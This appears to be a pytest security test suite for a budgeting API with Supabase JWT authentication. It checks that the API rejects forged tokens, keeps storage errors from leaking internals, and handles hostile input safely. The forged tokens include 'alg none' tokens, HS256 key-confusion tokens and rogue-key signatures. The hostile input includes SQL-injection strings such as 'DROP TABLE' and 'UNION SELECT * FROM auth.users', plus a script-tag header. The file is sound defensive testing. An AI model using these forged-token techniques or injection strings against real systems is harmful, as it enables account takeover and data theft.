@pytest.mark.parametrize("header", [None, "", "Basic dXNlcjpwYXNz", "Token abc", "Bearer", "Bearer ",
                                    "Bearer    ", "bearer", "JWT x.y.z"])
def test_missing_or_non_bearer_auth(auth_env, header):
    c, storage, run = auth_env
    headers = {} if header is None else {"Authorization": header}
    r = c.post("/v1/saved", json=saved_body(run), headers=headers)
    if header is None:
        assert_error(r, 401, "AUTH_REQUIRED")
    else:
        # Ambiguity: an empty/non-Bearer header may be AUTH_REQUIRED or AUTH_INVALID.
        assert_error(r, 401, codes={"AUTH_REQUIRED", "AUTH_INVALID"})
    assert storage.calls == []


def _bad_tokens(keys):
    now = int(time.time())
    good = sign(keys, claims())
    h, p, s = good.split(".")
    tampered_payload = b64u(json.dumps(claims(sub=str(uuid.uuid4()))).encode())
    rogue_ec = sign(keys, claims(), alg="ES256", key=keys.rogue_ec, kid=keys.ec_kid)
    rogue_unknown_kid = sign(keys, claims(), alg="ES256", key=keys.rogue_ec, kid="attacker-kid")
    rogue_rsa = sign(keys, claims(), alg="RS256", key=keys.rogue_rsa, kid=keys.rsa_kid)
    header_alg_swap = b64u(json.dumps({"alg": "ES384", "typ": "JWT", "kid": keys.ec_kid}).encode())
    return {
        "garbage": "not-a-jwt",
        "two_parts": "abc.def",
        "four_parts": good + ".extra",
        "bad_base64": "%%%.%%%.%%%",
        "json_not_object": b64u(b"[]") + "." + b64u(b"[]") + "." + b64u(b"sig"),
        "alg_none": raw_token({"alg": "none", "typ": "JWT"}, claims()),
        "alg_None_case": raw_token({"alg": "None", "typ": "JWT"}, claims()),
        "alg_none_with_kid": raw_token({"alg": "none", "typ": "JWT", "kid": keys.ec_kid}, claims()),
        "hs256_publishable_key": hs256_token(b"test-publishable-key", {"alg": "HS256", "typ": "JWT"}, claims()),
        "hs256_publishable_key_kid": hs256_token(b"test-publishable-key",
                                                 {"alg": "HS256", "typ": "JWT", "kid": keys.ec_kid}, claims()),
        "hs256_rsa_public_pem": hs256_token(keys.rsa_public_pem,
                                            {"alg": "HS256", "typ": "JWT", "kid": keys.rsa_kid}, claims()),
        "rs384_trusted_key": sign(keys, claims(), alg="RS384"),
        "ps256_trusted_key": sign(keys, claims(), alg="PS256"),
        "es384_header_swap": header_alg_swap + "." + p + "." + s,
        "expired": sign(keys, claims(exp=now - 3600, iat=now - 7200)),
        "expired_long_ago": sign(keys, claims(exp=1, iat=0)),
        "missing_exp": sign(keys, claims(exp=DROP)),
        "exp_string": sign(keys, claims(exp=str(now + 3600))),
        "wrong_aud": sign(keys, claims(aud="anon")),
        "aud_service_role": sign(keys, claims(aud="service_role")),
        "missing_aud": sign(keys, claims(aud=DROP)),
        "wrong_iss": sign(keys, claims(iss="https://evil.supabase.co/auth/v1")),
        "iss_without_path": sign(keys, claims(iss="https://example-ref.supabase.co")),
        "iss_http": sign(keys, claims(iss=ISSUER.replace("https://", "http://"))),
        "missing_iss": sign(keys, claims(iss=DROP)),
        "missing_sub": sign(keys, claims(sub=DROP)),
        "sub_not_uuid": sign(keys, claims(sub="admin")),
        "sub_empty": sign(keys, claims(sub="")),
        "sub_sql": sign(keys, claims(sub="' OR 1=1 --")),
        "sub_uuid_with_suffix": sign(keys, claims(sub=str(uuid.uuid4()) + "/../x")),
        "sub_number": sign(keys, claims(sub=12345)),
        "is_anonymous_true": sign(keys, claims(is_anonymous=True)),
        "signed_by_rogue_ec_same_kid": rogue_ec,
        "signed_by_rogue_ec_unknown_kid": rogue_unknown_kid,
        "signed_by_rogue_rsa_same_kid": rogue_rsa,
        "tampered_payload": h + "." + tampered_payload + "." + s,
        "truncated_signature": h + "." + p + "." + s[:-4],
        "empty_signature": h + "." + p + ".",
        "huge_token": "a" * 20_000 + "." + "b" * 20_000 + "." + "c" * 20_000,
    }


BAD_TOKEN_NAMES = sorted([
    "garbage", "two_parts", "four_parts", "bad_base64", "json_not_object", "alg_none", "alg_None_case",
    "alg_none_with_kid", "hs256_publishable_key", "hs256_publishable_key_kid", "hs256_rsa_public_pem",
    "rs384_trusted_key", "ps256_trusted_key", "es384_header_swap", "expired", "expired_long_ago",
    "missing_exp", "exp_string", "wrong_aud", "aud_service_role", "missing_aud", "wrong_iss",
    "iss_without_path", "iss_http", "missing_iss", "missing_sub", "sub_not_uuid", "sub_empty", "sub_sql",
    "sub_uuid_with_suffix", "sub_number", "is_anonymous_true", "signed_by_rogue_ec_same_kid",
    "signed_by_rogue_ec_unknown_kid", "signed_by_rogue_rsa_same_kid", "tampered_payload",
    "truncated_signature", "empty_signature", "huge_token",
])


@pytest.mark.parametrize("name", BAD_TOKEN_NAMES)
def test_bad_tokens_rejected(keys, auth_env, name):
    c, storage, run = auth_env
    token = _bad_tokens(keys)[name]
    r = c.post("/v1/saved", json=saved_body(run), headers=_hdr(token))
    if name == "huge_token":
        # Ambiguity: a server may refuse an oversized header before auth (400/413/431).
        not_500(r)
        assert r.status_code in (400, 401, 413, 431)
    else:
        assert_error(r, 401, "AUTH_INVALID")
    assert storage.calls == [], f"{name}: storage must not be called with an invalid token"
    assert token[:40] not in r.text


def test_valid_tokens_still_work(keys, auth_env):
    """Sanity control for the attack list: both supported algorithms succeed."""
    c, storage, run = auth_env
    for alg in ("ES256", "RS256"):
        r = c.post("/v1/saved", json=saved_body(run), headers=_hdr(sign(keys, claims(), alg=alg)))
        assert r.status_code == 201, (alg, r.text)


@pytest.mark.parametrize("variant", ["is_anonymous_false", "is_anonymous_missing", "aud_list", "nbf_future",
                                     "iat_future", "no_kid", "lowercase_scheme", "is_anonymous_string_true",
                                     "exp_now_plus_1"])
def test_token_edge_cases(keys, auth_env, variant):
    c, storage, run = auth_env
    now = int(time.time())
    expected = {201}
    scheme = "Bearer"
    if variant == "is_anonymous_false":
        tok = sign(keys, claims(is_anonymous=False))
    elif variant == "is_anonymous_missing":
        tok = sign(keys, claims(is_anonymous=DROP))
    elif variant == "exp_now_plus_1":
        tok = sign(keys, claims(exp=now + 60))
    else:
        expected = {201, 401}  # Ambiguity: the contract is silent on these
        if variant == "aud_list":
            tok = sign(keys, claims(aud=["authenticated"]))
        elif variant == "nbf_future":
            tok = sign(keys, claims(nbf=now + 3600))
        elif variant == "iat_future":
            tok = sign(keys, claims(iat=now + 3600))
        elif variant == "no_kid":
            tok = jwt.api_jws.encode(json.dumps(claims()).encode(), keys.ec, algorithm="ES256")
        elif variant == "is_anonymous_string_true":
            tok = sign(keys, claims(is_anonymous="true"))
        else:
            tok = sign(keys, claims())
            scheme = "bearer"
    r = c.post("/v1/saved", json=saved_body(run), headers={"Authorization": f"{scheme} {tok}"})
    not_500(r)
    assert r.status_code in expected, (variant, r.status_code, r.text)
    if r.status_code == 401:
        assert_error(r, 401, codes={"AUTH_INVALID", "AUTH_REQUIRED"})
        assert storage.calls == []


def test_auth_checked_before_storage_on_valid_body(keys, auth_env):
    c, storage, run = auth_env
    r = c.post("/v1/saved", json=saved_body(run), headers=_hdr(sign(keys, claims(exp=1))))
    assert_error(r, 401, "AUTH_INVALID")
    assert storage.calls == []


def test_invalid_body_with_valid_token_writes_nothing(keys, auth_env):
    c, storage, run = auth_env
    body = saved_body(run)
    body["transactions"][0]["amount"] = 4.37
    assert_error(c.post("/v1/saved", json=body, headers=_hdr(sign(keys, claims()))), 422, "INVALID_INPUT")
    body = saved_body(run)
    body["start"], body["end"] = body["end"], body["start"]
    assert_error(c.post("/v1/saved", json=body, headers=_hdr(sign(keys, claims()))), 422, "WINDOW_OUTSIDE_DATA")
    assert storage.calls == []


def test_invalid_token_and_invalid_body(keys, auth_env):
    c, storage, run = auth_env
    body = saved_body(run)
    body["foo"] = 1
    r = c.post("/v1/saved", json=body, headers=_hdr("garbage"))
    # Ambiguity: order of auth vs validation is not specified.
    assert_error(r, {401, 422}, codes={"AUTH_INVALID", "UNKNOWN_FIELD"})
    assert storage.calls == []


def test_token_from_one_user_is_forwarded_unchanged(keys, auth_env):
    """The API must forward the caller's own token, never a service key."""
    c, storage, run = auth_env
    tok = sign(keys, claims())
    assert c.post("/v1/saved", json=saved_body(run), headers=_hdr(tok)).status_code == 201
    for req in storage.calls:
        assert req.headers["authorization"] == f"Bearer {tok}"
        assert req.headers["apikey"] == "test-publishable-key"


def test_signed_out_endpoints_ignore_or_reject_bad_authorization(client, run):
    """Signed-out use is allowed; a garbage Authorization header on an open endpoint must not 500."""
    r = client.post("/v1/simulate", json=sim_body(run), headers={"Authorization": "Bearer garbage"})
    not_500(r)
    assert r.status_code in (200, 401)


def test_jwks_with_only_hmac_key_does_not_enable_hs256():
    """A JWKS containing a symmetric key must not make HS256 acceptable."""
    secret = b"shared-secret-of-at-least-32-bytes!!"
    jwks = {"keys": [{"kty": "oct", "k": b64u(secret), "kid": "hmac", "alg": "HS256"}]}
    from roundup_api.main import create_app
    storage = FakeStorage()
    try:
        app = create_app(supabase_url="https://example-ref.supabase.co", publishable_key="test-publishable-key",
                         jwks=jwks, storage_transport=storage.transport,
                         rate_limits={"saved": 1000, "read": 1000})
    except Exception:
        return  # refusing a symmetric JWKS at start-up is acceptable
    with make_client(app) as c:
        run = default_run(c)
        tok = hs256_token(secret, {"alg": "HS256", "typ": "JWT", "kid": "hmac"}, claims())
        r = c.post("/v1/saved", json=saved_body(run), headers=_hdr(tok))
        not_500(r)
        assert r.status_code in (401, 503)
        assert storage.calls == []


# ================================================================ storage failures

@pytest.mark.parametrize("mode,expected", [
    ("connect_error", {503}), ("timeout", {503}), ("server_error", {500, 503}),
    ("unauthorized", {401, 500, 503}), ("rls_denied", {401, 403, 500, 503}), ("not_json", {500, 503}),
    ("empty_array", {500, 503}), ("results_fail", {500, 503}),
])
def test_storage_failures_are_plain(keys, mode, expected):
    storage = FakeStorage(mode)
    with make_client(make_app(keys=keys, storage=storage)) as c:
        run = default_run(c)
        r = c.post("/v1/saved", json=saved_body(run), headers=_hdr(sign(keys, claims())))
        assert r.status_code in expected, (mode, r.status_code, r.text)
        assert_error(r, r.status_code)
        assert "SECRETPGDETAIL" not in r.text
        assert "42501" not in r.text
        assert "supabase.co" not in r.text


def test_storage_unavailable_message_has_no_url_or_key(keys):
    with make_client(make_app(keys=keys, supabase_url=None, publishable_key=None)) as c:
        run = default_run(c)
        r = c.post("/v1/saved", json=saved_body(run), headers=_hdr(sign(keys, claims())))
        assert_error(r, 503, "STORAGE_UNAVAILABLE")
        assert "SUPABASE" not in r.text


# ================================================================ SQL-looking strings

def test_sql_injection_name_is_stored_as_plain_data(keys, auth_env):
    c, storage, run = auth_env
    name = "x'); DROP TABLE app.scenarios; --"
    r = c.post("/v1/saved", json=saved_body(run, name=name), headers=_hdr(sign(keys, claims())))
    assert r.status_code == 201
    first = storage.calls[0]
    assert first.url.path == "/rest/v1/scenarios"
    assert "DROP" not in str(first.url), "values must go in the JSON body, not the URL/query"


@pytest.mark.parametrize("value", ["' OR 1=1 --", "1; SELECT pg_sleep(10)", "\" OR \"\"=\"",
                                   "Date' UNION SELECT * FROM auth.users--"])
def test_sql_looking_csv_and_mapping(client, value):
    quoted = '"' + value.replace('"', '""') + '"'
    r = _parse(client, parse_body(f"Date,Amount,{quoted}\n2024-01-03,4.37,{quoted}\n",
                                  date="Date", amount="Amount", description=value))
    assert r.status_code == 200, r.text
    assert r.json()["summary"]["rows"] == 1


# ================================================================ error hygiene

def test_errors_never_leak_internals_across_many_bad_inputs(client, run):
    bad = [
        ("/v1/simulate", b"{"), ("/v1/simulate", b"[1,2"), ("/v1/compare", b'{"a": }'),
        ("/v1/transactions/parse", b'{"csv": 5}'), ("/v1/simulate", b'{"transactions": [null]}'),
        ("/v1/simulate", json.dumps({**sim_body(run), "transactions": [None, 1, "x"]}).encode()),
        ("/v1/simulate", json.dumps({**sim_body(run), "start": "9999-99-99"}).encode()),
        ("/v1/simulate", json.dumps({**sim_body(run), "end": "0000-01-01"}).encode()),
        ("/v1/transactions/parse", json.dumps({"csv": "a", "mapping": None, "sign_convention": None}).encode()),
        ("/v1/transactions/parse", json.dumps({"csv": "a", "mapping": [], "sign_convention": 3}).encode()),
    ]
    for path, raw in bad:
        r = post_raw(client, path, raw)
        assert 400 <= r.status_code < 500, (path, raw[:60], r.status_code, r.text[:300])
        assert_error(r, r.status_code)


def test_405_and_404_use_error_envelope(client):
    for r in (client.get("/v1/simulate"), client.delete("/v1/health"), client.get("/v1/admin"),
              client.get("/docs"), client.get("/openapi.json")):
        not_500(r)
        if r.status_code in (404, 405):
            assert_error(r, r.status_code, codes={"NOT_FOUND", "METHOD_NOT_ALLOWED"})


def test_client_request_id_injection_ignored(client):
    r = client.get("/v1/health", headers={"X-Request-ID": "<script>x</script>" + "A" * 5000})
    assert r.status_code == 200
    rid = r.headers["x-request-id"]
    assert "<script>" not in rid and len(rid) < 200
